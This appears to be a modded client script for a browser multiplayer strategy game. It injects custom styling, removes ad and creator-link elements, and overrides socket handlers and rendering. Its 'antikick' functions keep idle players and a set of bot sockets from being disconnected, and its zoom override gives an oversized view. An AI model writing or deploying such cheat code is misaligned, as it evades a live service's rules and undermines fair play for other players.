font-family: 'regularF'; font-size: 20px; border-radius: 10px; color: #041d91;}#noobscriptUI>div>div,.buttonClass{border: 0.5px solid blue}.upgradeInfo,.unitInfo {border: 0.5px solid blue; } `;document.head.appendChild(temaoficial);}
function theme(){darkColor = "blue", backgroundColor = "#000", outerColor = "#050505", indicatorColor = "#fff", turretColor = "#00000099", bulletColor = "#A8A8A8", redColor = "blue", targetColor = "#b4b4b4"; playerColors = "#f9ff6070 #ff606070 #82ff6070 #607eff70 #60eaff70 #ff60ee70 #e360ff70 #ffaf6070 #a3ff6070 #ff609c70 #60ff8270 #cc60ff70 #c6595970 #404b7f70 #f2d95770 #c5525270 #c5525270 #498e5670 #c4515170 #c3545470 #c8575770 #c8595970 #5b74b670 #cd686870 #5c81bd70 #5bb14670 #d8c96370 #c5525270 #404b7f70 #c5525270 #c5525270 #c5525270 #c5525270 #404b7f70 #498e5670 #498e5670 #dbd24570 #ca514e70 #43427e70".split(" ");} theme();
//===================Fim===================//
instructionsIndex = 0;
instructionsSpeed = 0;
insturctionsCountdown = 0;
instructionsList = "".split(";");
instructionsIndex = UTILS.randInt(0, instructionsList.length - 1);
document.getElementById("gameTitle").innerHTML = "𝒟𝑀 Moderno";
document.getElementById("lobbyKey").innerHTML = "Party code";
document.getElementById("smallAdContainer").innerHTML = '';
document.getElementById("infoLinks").innerHTML = '';
document.getElementById("creatorLink").innerHTML = '';
document.getElementById("adContainer").innerHTML = ''
var randomLoadingTexts = ["Carregando ..."]
var css = document.createElement("style")
css.innerText = `
html, body {
	width: 100%; height: 100%; cursor: Crosshair; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }

body {
	background-color: #ffffff; margin: 0; overflow: hidden; cursor: Crosshair; }

a:link {
	color: #009bff;text-decoration: none;}

a:visited {
	color: #009bff;}

a:hover {
	color: #010b1a;}

.spanLink {
	cursor: pointer;color: #041d91;}

.allert {
color: #850000;}

.botao {
color: blue;}

.spanLink:hover {
	color: #010b1a;}

.deadLink {
	cursor: auto;color: #ffffff;}

.deadLink:hover {
	color: #ffffff;}

#shareContainer {
	padding: 5px; width: 100%; position: absolute; top: 10px; left: 10px; position: absolute; z-index: 200; }

#darkener {
	display: block; position: absolute; width: 100%; height: 100%; background-color: #000000;}

#menuContainer {
	width: 100%; height: 100%; display: flex; position: absolute; top: 10px; z-index: 100; align-items: center; text-align: center;}

#optionsContainer {
    padding: 10px; position: absolute; top: 0px; font-family: 'regularF'; text-align: right; color: #009bff; z-index: 100; font-size: 20px; }

#lobbyKey {
	font-size: 20px;}

#smallAdContainer {
	position: absolute; right: 14px; bottom: 44px; z-index: 100; border: dashed 6px rgba(35, 35, 35, 0.0); }

#gameUiContainer {
	position: absolute; width: 100%; height: 100%; display: none; pointer-events: none; }

#adHolder {
	display: inline-block;border: dashed 6px rgba(35, 35, 35, 0.0);}

#leaderboardContainer {position: absolute; top: 10px; right: 10px; padding: 10px; background-color: #000000; font-family: 'regularF'; font-size: 30px;text-shadow: 1px 0px 0px blue, -1px 0px 0px blue, 0px 1px 0px blue, 0px -1px 0px blue; border-radius: 10px; color: #000;border: 1px solid blue; }

.leaderboardItem {
	margin-top: 2px; color: rgba(255, 255, 255); font-family: 'regularF'; font-size: 17px; }

.leaderYou {color: blue; display: inline-block; max-width: 150px; margin-left: 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; -o-text-overflow: ellipsis;text-shadow: 0px 0px 8px blue; }

.leader {color: #0000ff80; display: inline-block; max-width: 150px; margin-left: 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; -o-text-overflow: ellipsis;text-shadow: 0px 0px 8px #000; }

.scoreText {color: #000; text-align: left; float: right; margin-left: 10px; display: inline-block; text-shadow: 0 0 3px blue;}

#statContainer {
	position: absolute;bottom: 10px;left: 10px;}

#scoreContainer {display: inline-block; padding: 10px; background-color: #000000; font-family: 'regularF'; font-size: 20px; border-radius: 10px; color: blue;border: 1px solid blue;}

#unitList {
	text-align: center; width: 100%; position: absolute; bottom: 6px; }

.unitItem {pointer-events: all; margin-left: 10px;border: 1px solid blue; position: relative; display: inline-block; width: 65px; height: 65px; background-color: #000000; border-radius: 10px; cursor: pointer; }

.unitItemA {
	pointer-events: all; margin-left: 10px; position: relative; display: inline-block; width: 65px; height: 65px; background-color: #00000000; border-radius: 4px; cursor: pointer; }

.unitItem:hover {background-color: #000000;border: 3px solid blue;}

#unitInfoContainer {
	padding: 10px;display: none;}

.upgradeInfo {margin-top: 5px; padding: 10px; background-color: #000000; border-radius: 4px; font-family: 'regularF'; max-width: 200px; overflow: auto; cursor: pointer; pointer-events: all;border: 0.5px solid blue; }

.upgradeInfo:hover {background-color: #000000;border: 3px solid blue;}

.unitInfo {padding: 10px; background-color: #000000; border-radius: 4px; font-family: 'regularF'; max-width: 200px; overflow: auto;border: 0.5px solid blue; }

.unitInfoName {
	font-size: 22px;color: #fff;}

.unitInfoCost {
	font-size: 16px;color: #fff;}

.unitInfoDesc {
	font-size: 16px;color: #d1d1d1;}

.unitInfoType {
	padding-top: 5px; font-size: 16px; color: #b2b2b2; float: left; }

.unitInfoLimit {
	display: inline-block; float: right; text-align: right; padding-top: 5px; font-size: 16px; color: #b2b2b2; }

#chatBox {
    position: absolute; bottom: 10px; right: 10px; width: 300px; overflow: hidden; }

#chatListWrapper {background-color: #000000;border-radius: 4px 4px 0px 0px;height: 215px;border: 1px solid blue;}

.chatText {text-shadow: 1px 0px 0px #ffffff50, -1px 0px 0px #ffffff50, 0px 1px 0px #ffffff50, 0px -1px 0px #ffffff50;color: #000;}

#chatList {width: 100%; font-family: 'regularF'; padding: 8px; margin: 0; list-style: none; box-sizing: border-box; color: #fff; overflow: hidden; word-wrap: break-word; position: absolute; bottom: 30px; font-size: 16px; line-height: 23px;}

#chatInput {background-color: #000000; font-family: 'regularF'; font-size: 16px; padding: 5px; color: #fff; width: 100%; pointer-events: all; outline: none; border: 0; box-sizing: border-box; border-radius: 0px 0px 4px 4px;border: 1px solid blue; }

#sellButton {display: none; position: absolute; bottom: 65px; left: 10px; background-color: #000000; border-radius: 4px; font-family: 'regularF'; font-size: 17px; color: #fff; cursor: pointer; padding: 2px; pointer-events: all;border: 0.5px solid blue; }

#sellButton:hover {background-color: #000000;border: 3px solid blue;}

.greyMenuText {color:#010409}

.whiteText {color: #000;text-shadow: 0 0 3px blue;}

#userNameInput {font-family: 'regularF'; font-size: 26px; padding: 6px; padding-left: 12px; border: none; border-radius: 4px; margin-left: 10px; background-color: #010409; color: #f9f9f9; border: 2px solid blue; border-radius: 10px;}

#enterGameButton {font-family: 'regularF'; font-size: 26px; padding: 5px; color: #ffffff; background-color: #010409; border: none; cursor: pointer; margin-left: 10px; border-radius: 4px; border: 2px solid blue; border-radius: 10px; }

#enterGameButton:hover {background-color: blue;}

#loadingContainer {
	display: none; font-family: 'regularF'; font-size: 26px; padding: 6px; color: #FFFFFF; }

#gameTitle {
color: #020901;
    font-size: 15r0px;
    width: 100%;
    top: 15%;
    position: absolute;
    text-align: center;
    font-family: 'regularF';
    text-shadow: 4px 0px 0px #00ff1f, -3px 0px 0px #002aff, 0px 3px 0px #00b8ff, 0px -3px 0px blue, 3px 3px 0px #ffce00, 3px -3px 0px blue, -3px 3px 0px blue, -3px -3px 0px blue;
}


#instructionsText {font-size: 30px; width: 400px; text-align: center; font-family: 'regularF'; margin-top: 20px; display: inline-block;text-shadow:2px 0px 0px blue,-2px 0px 0px blue,0px 2px 0px blue,0px -2px 0px blue,2px 2px 0px blue,2px -2px 0px blue,-2px 2px 0px blue,-2px -2px 0px blue; }

#creatorLink {
	z-index: 1000; position: absolute; bottom: 0; text-align: center; font-size: 20px; font-family: 'regularF'; color: #009bff; padding: 5px; margin-left: 10px; margin-bottom: 5px; padding: 5px; }

#infoLinks {
	z-index: 1000; position: absolute; bottom: 0; right: 0; text-align: center; font-size: 20px; font-family: 'regularF'; color: #009bff; padding: 5px; margin-right: 10px; margin-bottom: 5px; }

#infoLinks2 {
	z-index: 1000; position: absolute; top: 0; right: 0; text-align: center; font-size: 20px; font-family: 'regularF'; color: #009bff; padding: 5px; margin-right: 10px; margin-bottom: 5px; }

#skinInfo {
	position: absolute; display: none; text-align: left; width: 110px; margin-left: -145px; padding: 6px; padding-top: 13px; padding-left: 16px; color:#ffffff; border-radius: 4px;  font-family: 'regularF'; font-size: 26px; background-color: #00000000 }

#skinName {
	padding: 4px;padding-left: 0px;color: #ffffff;font-size: 22px;}

#joinTroopContainer {display: inline-block; padding: 10px; background-color:#000000; font-family: 'regularF'; font-size: 20px; border-radius: 10px; color: blue;border: 1px solid blue;}

#skinSelector {display: none; font-family: 'regularF'; font-size: 26px; padding: 6px; padding-left: 10px; padding-right: 10px; border: none; border-radius: 4px; background-color: #010409; color: #ffffff; cursor: pointer; border: 2px solid blue; border-radius: 10px; }

#skinSelector:hover {background-color: blue;color: #ffffff;}

#TotalMembers { display: inline-block; padding: 10px; background-color: #000000; font-family: 'regularF'; font-size: 20px; border-radius: 10px; color: blue;margin-left: 4px;border: 1px solid blue;}
`
document.head.appendChild(css)

/*SAVE BASE*/
var loadedBase = null;
var defendInterval = null;
var joinEnabled = true
var joinTroopsDiv = document.createElement("div")
joinTroopsDiv.id = "joinTroopContainer"
document.getElementById("statContainer").appendChild(joinTroopsDiv)
joinTroopsDiv.innerText = joinEnabled?("ON"):("OFF")


//===================Fim===================//
//===================Extras===================//
playerSkins = 0;cid = UTILS.getUniqueID();localStorage.setItem("cid",cid);upgrInputsToIndex = {};
onbeforeunload = function(a) {};
playerBorderRot=selUnitType
function antikick() {setInterval(function(){if(window.socket){window.socket.emit("2",window.camX,window.camY)}},20000)}antikick();
function antikickbots() {setInterval(function(){if(window.sockets){for (var z = 0; z < window.sockets.length; z++){window.sockets[z].emit("2",window.camX,window.camY)}}},20000)}antikickbots();
window.renderPlayer = function(a, d, c, b, g) {b.save();if (a.skin && 0 < a.skin && a.skin <= playerSkins && !skinSprites[a.skin]) {var e = new Image;e.onload = function() {this.readyToDraw = !0;this.onload = null;g == currentSkin && changeSkin(0);};e.src = ".././img/skins/skin_" + (a.skin - 1) + ".png";skinSprites[a.skin] = e;};a.skin && skinSprites[a.skin] && skinSprites[a.skin].readyToDraw ? (e = a.size - b.lineWidth / 4, b.lineWidth /= 2, renderCircle(d, c, a.size, b, !1, !0)) : g || (b.fillStyle = "rgba(255, 255, 255, 0)", renderCircle(d, c, a.size, b));    b.restore();};

//===================Fim===================//

//===================Alterações===================//
moveSelUnits=function(){if(selUnits.length){var a=player.x+targetDst*MathCOS(targetDir)+camX,d=player.y+targetDst*MathSIN(targetDir)+camY,c=1;if(c&&1<selUnits.length)for(var b=0;b<users.length;++b)if(UTILS.pointInCircle(a,d,users[b].x,users[b].y,users[b].size)){c=0;break}var g=-1;if(c)for(b=0;b<units.length;++b)if(units[b].onScreen&&units[b].owner!=player.sid&&UTILS.pointInCircle(a,d,units[b].x,units[b].y,units[b].size)){c=0;g=units[b].id;break}1==selUnits.length&&(c=0);for(var e=[],b=0;b<selUnits.length;++b)e.push(selUnits[b].id);
socket.emit("5",UTILS.roundToTwo(a),UTILS.roundToTwo(d),e,joinEnabled?(0):(c),g)}}

setupSocket=function(){socket.on("connect_error",function(){lobbyURLIP?kickPlayer("Connection failed. Please check your lobby ID"):kickPlayer("Connection failed. Check your internet and firewall settings")});socket.on("disconnect",function(a){kickPlayer("Disconnected.")});socket.on("error",function(a){kickPlayer("Disconnected. The server may have updated.")});socket.on("kick",function(a){kickPlayer(a)});socket.on("lk",function(a){partyKey=a});socket.on("spawn",function(){gameState=1;unitList=share.getUnitList();
resetCamera();toggleMenuUI(!1);toggleGameUI(!0);updateUnitList();player.upgrades=share.getBaseUpgrades();mainCanvas.focus()});socket.on("gd",function(a){gameData=a});socket.on("mpd",function(a){mapBounds=a});socket.on("ch",function(a,d,c){addChatLine(a,d,c)});socket.on("setUser",function(a,d){if(a&&a[0]){var c=getUserBySID(a[0]),b={sid:a[0],name:a[1],iName:"Headquarters",upgrades:[window.share.getBaseUpgrades()[1]],dead:!1,color:a[2],size:a[3],startSize:a[4],x:a[5],y:a[6],buildRange:a[7],gridIndex:a[8],spawnProt:a[9],skin:a[10],desc:"Base of operations of "+
a[1] + " ID: " + a[0] + " X: " + a[5] + " Y: " + a[6],kills:0,typeName:"Base"};null!=c?(users[c]=b,d&&(player=users[c])):(users.push(b),d&&(player=users[users.length-1]))}});socket.on("klUser",function(a){var d=getUserBySID(a);null!=d&&(users[d].dead=!0);player&&player.sid==a&&(hideMainMenuText(),leaveGame())});socket.on("delUser",function(a){a=getUserBySID(a);null!=a&&users.splice(a,1)});socket.on("au",function(a){a&&(units.push({id:a[0],owner:a[1],uPath:a[2]||0,type:a[3]||0,color:a[4]||0,paths:a[5],x:a[6]||0,sX:a[6]||0,y:a[7]||0,sY:a[7]||0,dir:a[8]||
0,turRot:a[8]||0,speed:a[9]||0,renderIndex:a[10]||0,turretIndex:a[11]||0,range:a[12]||0,cloak:a[13]||0}),units[units.length-1].speed&&(units[units.length-1].startTime=window.performance.now()),a=getUnitFromPath(units[units.length-1].uPath))&&(units[units.length-1].size=a.size,units[units.length-1].shape=a.shape,units[units.length-1].layer=a.layer,units[units.length-1].renderIndex||(units[units.length-1].renderIndex=a.renderIndex),units[units.length-1].range||(units[units.length-1].range=a.range),
units[units.length-1].turretIndex||(units[units.length-1].turretIndex=a.turretIndex),units[units.length-1].iSize=a.iSize)});socket.on("spa",function(a,d,c,b){a=getUnitById(a);if(null!=a){var g=UTILS.getDistance(d,c,units[a].x||d,units[a].y||c);300>g&&g?(units[a].interpDst=g,units[a].interpDstS=g,units[a].interpDir=UTILS.getDirection(d,c,units[a].x||d,units[a].y||c)):(units[a].interpDst=0,units[a].interpDstS=0,units[a].interpDir=0,units[a].x=d,units[a].y=c);units[a].interX=0;units[a].interY=0;units[a].sX=
units[a].x||d;units[a].sY=units[a].y||c;b[0]&&(units[a].dir=b[0],units[a].turRot=b[0]);units[a].paths=b;units[a].startTime=window.performance.now()}});socket.on("uc",function(a,d){unitList&&(unitList[a].count=d);forceUnitInfoUpdate=!0});socket.on("uul",function(a,d){unitList&&(unitList[a].limit+=d)});socket.on("rpu",function(a,d){var c=getUnitFromPath(a);c&&(c.dontShow=d,forceUnitInfoUpdate=!0)});socket.on("sp",function(a,d){var c=getUserBySID(a);null!=c&&(users[c].spawnProt=d)});socket.on("ab",function(a){a&&
bullets.push({x:a[0],sX:a[0],y:a[1],sY:a[1],dir:a[2],speed:a[3],size:a[4],range:a[5]})});socket.on("uu",function(a,d){if(void 0!=a&&d){var c=getUnitById(a);if(null!=c)for(var b=0;b<d.length;)units[c][d[b]]=d[b+1],"dir"==d[b]&&(units[c].turRot=d[b+1]),b+=2}});socket.on("du",function(a){a=getUnitById(a);null!=a&&units.splice(a,1)});socket.on("sz",function(a,d){var c=getUserBySID(a);null!=c&&(users[c].size=d)});socket.on("pt",function(a){scoreContainer.innerHTML="Power: <span class='spanLink'>"+a+
"</span>",player.power = a});socket.on("l",function(a){for(var d="",c=1,b=0;b<a.length;)d+="<div class='leaderboardItem'><div style='display:inline-block;float:left;' class='whiteText'>"+c+".</div> <div class='"+(player&&a[b]==player.sid?"leaderYou":"leader")+"'>"+a[b+1]+"</div><div class='scoreText'>"+a[b+2]+"</div></div>",c++,b+=3;leaderboardList.innerHTML=d})}


upgradeUnit=function(a){socket&&gameState&&(1==selUnits.length?socket.emit("4",selUnits[0].id,a):(activeBase)?(a==0&&activeBase.sid==player.sid?(socket.emit("4",0,a,1)):(handleActiveBaseUpgrade(activeBase.sid,activeBase.upgrades[a].name))):(upgradeSelUnits(selUnits[0],a)))}

window.toggleUnitInfo=function(a,d){var c="";a&&a.uPath&&(c=void 0!=a.group?a.group:a.uPath[0],c=unitList[c].limit?(unitList[c].count||0)+"/"+unitList[c].limit:"");if(a&&(forceUnitInfoUpdate||"block"!=unitInfoContainer.style.display||unitInfoName.innerHTML!=(a.iName||a.name)||lastCount!=c)){forceUnitInfoUpdate=!1;unitInfoContainer.style.display="block";unitInfoName.innerHTML=a.iName||a.name;a.cost?(unitInfoCost.innerHTML="Cost "+a.cost,unitInfoCost.style.display="block"):unitInfoCost.style.display="none";
unitInfoDesc.innerHTML=a.desc;unitInfoType.innerHTML=a.typeName;var b=a.space;lastCount=c;c='<span style="color:#fff">'+c+"</span>";unitInfoLimit.innerHTML=b?'<span><i class="material-icons" style="vertical-align: top; font-size: 20px;">&#xE7FD;</i>'+b+"</span> "+c:c;unitInfoUpgrades.innerHTML="";if(d&&a.upgrades){for(var g,e,h,f,k,c=0;c<a.upgrades.length;++c)(function(b){g=a.upgrades[b];var c=!0;g.lockMaxBuy&&void 0!=g.unitSpawn&&(unitList[g.unitSpawn].count||0)>=(unitList[g.unitSpawn].limit||0)?
c=!1:g.dontShow&&(c=!1);c&&(e=document.createElement("div"),e.className="upgradeInfo",h=document.createElement("div"),h.className="unitInfoName",h.innerHTML=g.name,e.appendChild(h),f=document.createElement("div"),f.className="unitInfoCost",g.cost?(f.innerHTML="Cost "+g.cost,e.appendChild(f)):(null),k=document.createElement("div"),k.id="upgrDesc"+b,k.className="unitInfoDesc",k.innerHTML=g.desc,k.style.display="none",e.appendChild(k),e.onmouseover=function(){document.getElementById("upgrDesc"+b).style.display="block"},
e.onmouseout=function(){document.getElementById("upgrDesc"+b).style.display="none"},e.onclick=function(){upgradeUnit(b);mainCanvas.focus()},unitInfoUpgrades.appendChild(e))})(c);g=e=h=f=k=null}}else a||(unitInfoContainer.style.display="none")}

updateGameLoop=function(a){if(player&&gameData){updateTarget();if(gameState&&mapBounds){if(camXS||camYS)camX+=camXS*cameraSpd*a,camY+=camYS*cameraSpd*a;player.x+camX<mapBounds[0]?camX=mapBounds[0]-player.x:player.x+camX>mapBounds[0]+mapBounds[2]&&(camX=mapBounds[0]+mapBounds[2]-player.x);player.y+camY<mapBounds[1]?camY=mapBounds[1]-player.y:player.y+camY>mapBounds[1]+mapBounds[3]&&(camY=mapBounds[1]+mapBounds[3]-player.y);
currentTime-lastCamSend>=sendFrequency&&(lastCamX!=camX||lastCamY!=camY)&&(lastCamX=camX,lastCamY=camY,lastCamSend=currentTime,socket.emit("2",Math.round(camX),Math.round(camY)))}renderBackground(outerColor);var d=(player.x||0)-maxScreenWidth/2+camX,c=(player.y||0)-maxScreenHeight/2+camY;mapBounds&&(mainContext.fillStyle=backgroundColor,mainContext.fillRect(mapBounds[0]-d,mapBounds[1]-c,mapBounds[2],mapBounds[3]));for(var b,g,e=0;e<units.length;++e)b=units[e],b.interpDst&&(g=b.interpDst*a*.015,b.interX+=
g*MathCOS(b.interpDir),b.interY+=g*MathSIN(b.interpDir),b.interpDst-=g,.1>=b.interpDst&&(b.interpDst=0,b.interX=b.interpDstS*MathCOS(b.interpDir),b.interY=b.interpDstS*MathSIN(b.interpDir))),b.speed&&(updateUnitPosition(b),b.x+=b.interX||0,b.y+=b.interY||0);var h,f;if(gameState)if(activeUnit){h=player.x-d+targetDst*MathCOS(targetDir)+camX;f=player.y-c+targetDst*MathSIN(targetDir)+camY;var k=UTILS.getDirection(h,f,player.x-d,player.y-c);0==activeUnit.type?(b=UTILS.getDistance(h,f,player.x-d,player.y-
c),b-activeUnit.size<player.startSize?(h=player.x-d+(activeUnit.size+player.startSize)*MathCOS(k),f=player.y-c+(activeUnit.size+player.startSize)*MathSIN(k)):b+activeUnit.size>player.buildRange-.15&&(h=player.x-d+(player.buildRange-activeUnit.size-.15)*MathCOS(k),f=player.y-c+(player.buildRange-activeUnit.size-.15)*MathSIN(k))):1==activeUnit.type||2==activeUnit.type?(h=player.x-d+(activeUnit.size+player.buildRange)*MathCOS(k),f=player.y-c+(activeUnit.size+player.buildRange)*MathSIN(k)):3==activeUnit.type&&
(b=UTILS.getDistance(h,f,player.x-d,player.y-c),b-activeUnit.size<player.startSize?(h=player.x-d+(activeUnit.size+player.startSize)*MathCOS(k),f=player.y-c+(activeUnit.size+player.startSize)*MathSIN(k)):b+activeUnit.size>player.buildRange+2*activeUnit.size&&(h=player.x-d+(player.buildRange+activeUnit.size)*MathCOS(k),f=player.y-c+(player.buildRange+activeUnit.size)*MathSIN(k)));activeUnitDir=k;activeUnitDst=UTILS.getDistance(h,f,player.x-d,player.y-c);activeUnit.dontPlace=!1;mainContext.fillStyle=
outerColor;if(0==activeUnit.type||2==activeUnit.type||3==activeUnit.type)for(e=0;e<units.length;++e)if(1!=units[e].type&&units[e].owner==player.sid&&0<=activeUnit.size+units[e].size-UTILS.getDistance(h,f,units[e].x-d,units[e].y-c)){mainContext.fillStyle=redColor;activeUnit.dontPlace=!0;break}renderCircle(h,f,activeUnit.range?activeUnit.range:activeUnit.size+30,mainContext,!0)}else if(selUnits.length)for(e=0;e<selUnits.length;++e)mainContext.fillStyle=outerColor,1<selUnits.length?renderCircle(selUnits[e].x-
d,selUnits[e].y-c,selUnits[e].size+25,mainContext,!0):renderCircle(selUnits[e].x-d,selUnits[e].y-c,selUnits[e].range?selUnits[e].range:selUnits[e].size+25,mainContext,!0);else activeBase&&(mainContext.fillStyle=outerColor,renderCircle(activeBase.x-d,activeBase.y-c,activeBase.size+50,mainContext,!0));if(selUnits.length)for(mainContext.strokeStyle=targetColor,e=0;e<selUnits.length;++e)selUnits[e].gatherPoint&&renderDottedCircle(selUnits[e].gatherPoint[0]-d,selUnits[e].gatherPoint[1]-c,30,mainContext);
for(e=0;e<users.length;++e)if(b=users[e],!b.dead){mainContext.lineWidth=1.2*outlineWidth;mainContext.strokeStyle=indicatorColor;isOnScreen(b.x-d,b.y-c,b.buildRange)&&(mainContext.save(),mainContext.translate(b.x-d,b.y-c),mainContext.rotate(playerBorderRot),renderDottedCircle(0,0,b.buildRange,mainContext),renderDottedCircle(0,0,b.startSize,mainContext),mainContext.restore());b.spawnProt&&(mainContext.strokeStyle=redColor,mainContext.save(),mainContext.translate(b.x-d,b.y-c),mainContext.rotate(playerBorderRot),
renderDottedCircle(0,0,b.buildRange+140,mainContext),mainContext.restore());for(var m=0;m<users.length;++m)e<m&&!users[m].dead&&(mainContext.strokeStyle=b.spawnProt||users[m].spawnProt?redColor:indicatorColor,playersLinked(b,users[m])&&(isOnScreen(b.x-d,b.y-c,0)||isOnScreen(users[m].x-d,users[m].y-c,0)||isOnScreen((b.x+users[m].x)/2-d,(b.y+users[m].y)/2-c,0))&&(g=UTILS.getDirection(b.x,b.y,users[m].x,users[m].y),renderDottedLine(b.x-(b.buildRange+lanePad+(b.spawnProt?140:0))*MathCOS(g)-d,b.y-(b.buildRange+
lanePad+(b.spawnProt?140:0))*MathSIN(g)-c,users[m].x+(users[m].buildRange+lanePad+(users[m].spawnProt?140:0))*MathCOS(g)-d,users[m].y+(users[m].buildRange+lanePad+(users[m].spawnProt?140:0))*MathSIN(g)-c,mainContext)))}mainContext.strokeStyle=darkColor;mainContext.lineWidth=1.2*outlineWidth;for(e=0;e<units.length;++e)b=units[e],b.layer||(b.onScreen=!1,isOnScreen(b.x-d,b.y-c,b.size)&&(b.onScreen=!0,renderUnit(b.x-d,b.y-c,b.dir,b,playerColors[b.color],mainContext)));for(e=0;e<units.length;++e)b=units[e],
1==b.layer&&(b.onScreen=!1,isOnScreen(b.x-d,b.y-c,b.size)&&(b.onScreen=!0,renderUnit(b.x-d,b.y-c,b.dir,b,playerColors[b.color],mainContext)));mainContext.fillStyle=bulletColor;for(e=bullets.length-1;0<=e;--e){b=bullets[e];if(b.speed&&(b.x+=b.speed*a*MathCOS(b.dir),b.y+=b.speed*a*MathSIN(b.dir),UTILS.getDistance(b.sX,b.sY,b.x,b.y)>=b.range)){bullets.splice(e,1);continue}isOnScreen(b.x-d,b.y-c,b.size)&&renderCircle(b.x-d,b.y-c,b.size,mainContext)}mainContext.strokeStyle=darkColor;mainContext.lineWidth=
1.2*outlineWidth;for(e=0;e<users.length;++e)b=users[e],!b.dead&&isOnScreen(b.x-d,b.y-c,b.size)&&(renderPlayer(b,b.x-d,b.y-c,mainContext),"unknown"!=b.name&&(tmpIndx=b.name+"-"+b.size,20<=b.size&&b.nameSpriteIndx!=tmpIndx&&(b.nameSpriteIndx=tmpIndx,b.nameSprite=renderText(b.name,b.size/4)),b.nameSprite&&mainContext.drawImage(b.nameSprite,b.x-d-b.nameSprite.width/2,b.y-c-b.nameSprite.height/2,b.nameSprite.width,b.nameSprite.height)));if(selUnits.length)for(e=selUnits.length-1;0<=e;--e)selUnits[e]&&
0>units.indexOf(selUnits[e])&&disableSelUnit(e);activeUnit&&renderUnit(h,f,k,activeUnit,playerColors[player.color],mainContext);showSelector&&(mainContext.fillStyle="rgba(255, 255, 255, 0.1)",h=player.x-d+targetDst*MathCOS(targetDir)+camX,f=player.y-c+targetDst*MathSIN(targetDir)+camY,mainContext.fillRect(mouseStartX,mouseStartY,h-mouseStartX,f-mouseStartY));playerBorderRot+=a/5600;hoverUnit?toggleUnitInfo(hoverUnit):activeBase?toggleUnitInfo(activeBase,true):activeUnit?toggleUnitInfo(activeUnit):
0<selUnits.length?toggleUnitInfo(selUnits[0].info,!0):toggleUnitInfo()}};

function renderUnit(a,d,c,b,g,e,k){
var f=b.size*(k?iconSizeMult:1),h=f+":"+b.cloak+":"+b.renderIndex+":"+b.iSize+":"+b.turretIndex+":"+b.shape+":"+g;
if(!unitSprites[h]){var m=document.createElement("canvas"),l=m.getContext("2d");
m.width=2*f+30;m.height=m.width;m.style.width=m.width+"px";
m.style.height=m.height+"px";l.translate(m.width/2,m.height/2);
l.lineWidth=outlineWidth*(k?.9:1.2);l.strokeStyle=darkColor;
l.fillStyle=g;
4==b.renderIndex?l.fillStyle=turretColor:5==b.renderIndex&&(l.fillStyle=turretColor,renderRect(0,.76*f,1.3*f,f/2.4,l),l.fillStyle=g);b.cloak&&(l.fillStyle=backgroundColor);
"circle"==b.shape?(renderCircle(0,0,f,l),
b.iSize&&(l.fillStyle=turretColor,renderCircle(0,0,f*b.iSize,l))):"triangle"==b.shape?(renderTriangle(0,0,f,l),b.iSize&&(l.fillStyle=turretColor,renderTriangle(0,2,f*b.iSize,l))):"hexagon"==b.shape?(renderAgon(0,0,f,l,6),b.iSize&&(l.fillStyle=turretColor,renderAgon(0,0,f*b.iSize,l,6))):"octagon"==b.shape?(l.rotate(MathPI/8),renderAgon(0,0,.96*f,l,8),b.iSize&&(l.fillStyle=turretColor,renderAgon(0,0,.96*f*b.iSize,l,8))):"pentagon"==b.shape?(l.rotate(-MathPI/2),renderAgon(0,0,1.065*f,l,5),b.iSize&&(l.fillStyle=turretColor,renderAgon(0,0,1.065*f*b.iSize,l,5))):"square"==b.shape?(renderSquare(0,0,f,l),b.iSize&&(l.fillStyle=turretColor,renderSquare(0,0,f*b.iSize,l))):"spike"==b.shape?renderStar(0,0,f,.7*f,l,8):"star"==b.shape&&(f*=1.2,renderStar(0,0,f,.7*f,l,6));
if(1==b.renderIndex)l.fillStyle=turretColor,renderRect(f/2.8,0,f/4,f/1,l),renderRect(-f/2.8,0,f/4,f/1,l);
else if(2==b.renderIndex)l.fillStyle=turretColor,renderRect(f/2.5,f/2.5,f/2.5,f/2.5,l),renderRect(-f/2.5,f/2.5,f/2.5,f/2.5,l),renderRect(f/2.5,-f/2.5,f/2.5,f/2.5,l),renderRect(-f/2.5,-f/2.5,f/2.5,f/2.5,l);
else if(3==b.renderIndex)l.fillStyle=turretColor,l.rotate(MathPI/2),renderRectCircle(0,0,.75*f,f/2.85,3,l),renderCircle(0,0,.5*f,l),l.fillStyle=g;
else if(6==b.renderIndex)l.fillStyle=turretColor,l.rotate(MathPI/2),renderRectCircle(0,0,.7*f,f/4,5,l),l.rotate(-MathPI/2),renderAgon(0,0,.4*f,l,6);
else if(7==b.renderIndex)for(g=0;3>g;++g)l.fillStyle=g?1==g?"#93e86500":"#a2ff6f00":"#89d95f00",renderStar(0,0,f,.9*f,l,100),f*=.75;
else 8==b.renderIndex&&(l.fillStyle=turretColor,renderRectCircle(0,0,.75*f,f/2.85,3,l),renderSquare(0,0,.5*f,l));1!=b.type&&b.turretIndex&&renderTurret(0,0,b.turretIndex,k?iconSizeMult:1,-(MathPI/2),l);
unitSprites[h]=m}f=unitSprites[h];e.save();e.translate(a,d);e.rotate(c+MathPI/2);
e.drawImage(f,-(f.width/2),-(f.height/2),f.width,f.height);
1==b.type&&b.turretIndex&&renderTurret(0,0,b.turretIndex,k?iconSizeMult:1,b.turRot-MathPI/2-c,e);e.restore()};
renderText=function(a, d) { var c = document.createElement("canvas") , b = c.getContext("2d"); b.font = d + "px regularF"; var g = b.measureText(a); c.width = g.width + 20; c.height = 2 * d; b.translate(c.width / 2, c.height / 2); b.font = d + "px regularF"; b.fillStyle = "#000000"; b.textBaseline = "middle"; b.textAlign = "center"; b.strokeStyle = darkColor; b.lineWidth = outlineWidth; b.strokeText(a, 0, 0); b.fillText(a, 0, 0); return c }
updateSelUnitViews=function() {sellButton.style.display = "block";for (var a = 0, d = 0; d < selUnits.length; ++d)a += Math.round(selUnits[d].info.cost / 2);a ? sellButton.innerHTML = "Sell <span class='unitInfoCost'>" + a + "</span>" : sellButton.style.display = "none"}
cameraSpd *=1.5
var scroll = 0;
zoom  = function(a) {
    a = window.event || a;
    a.stopPropagation();
    scroll = Math.max(-1, Math.min(1, a.wheelDelta || -a.detail));
    -1 == scroll ? 50000 > maxScreenHeight && (maxScreenHeight += 130,
    maxScreenWidth += 130,
    resize(),
    scroll = 0) : 1 == scroll && 150 < maxScreenHeight && (maxScreenHeight -= 130,
    maxScreenWidth -= 130,
    resize(),
    scroll = 0)
}
